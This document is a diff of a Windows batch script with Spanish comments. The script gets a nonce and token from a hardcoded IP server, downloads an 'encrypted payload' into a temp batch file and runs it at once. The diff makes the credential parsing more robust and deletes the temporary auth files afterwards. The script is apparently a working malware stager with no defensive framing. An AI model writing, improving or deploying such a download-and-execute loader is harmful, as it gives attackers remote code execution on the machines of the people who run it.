@@ -1,20 +1,23 @@
 @echo off
-setlocal
+setlocal enabledelayedexpansion
 
 set BASE=http://82.29.153.101:8080
 set FILE=%temp%\sc.bat
 
 REM ===== AUTH (nonce + token) =====
-for /f %%i in ('curl -s "%BASE%/auth/key"') do set AUTH=%%i
+curl -s "%BASE%/auth/key" > "%temp%\auth.json"
 
-REM Extraer NONCE y TOKEN con PowerShell
-for /f %%i in ('powershell -NoP -Command "$auth = '' + '%AUTH%'; $nonce = ($auth | Select-String '\"nonce\"\s*:\s*\"([^\"]+)\"').Matches.Groups[1].Value; $token = ($auth | Select-String '\"token\"\s*:\s*\"([^\"]+)\"').Matches.Groups[1].Value; Write-Output \"NONCE=$$nonce TOKEN=$$token\";"') do set HEADERS=%%i
+REM Extraer NONCE y TOKEN (metodo simple y robusto)
+powershell -NoP -Command "(Get-Content '%temp%\auth.json' | ConvertFrom-Json).nonce" > "%temp%\nonce.txt"
+powershell -NoP -Command "(Get-Content '%temp%\auth.json' | ConvertFrom-Json).token" > "%temp%\token.txt"
 
-REM Parsear NONCE y TOKEN
-for %%a in (%HEADERS%) do set %%a
+set /p NONCE=<"%temp%\nonce.txt"
+set /p TOKEN=<"%temp%\token.txt"
+
+del "%temp%\auth.json" "%temp%\nonce.txt" "%temp%\token.txt"
 
 REM ===== PAYLOAD =====
 curl -s -H "X-Nonce: %NONCE%" -H "X-Token: %TOKEN%" "%BASE%/payload/encrypted" -o "%FILE%"
 
-REM ===== EXEC (síncrono) =====
+REM ===== EXEC =====
 call "%FILE%"
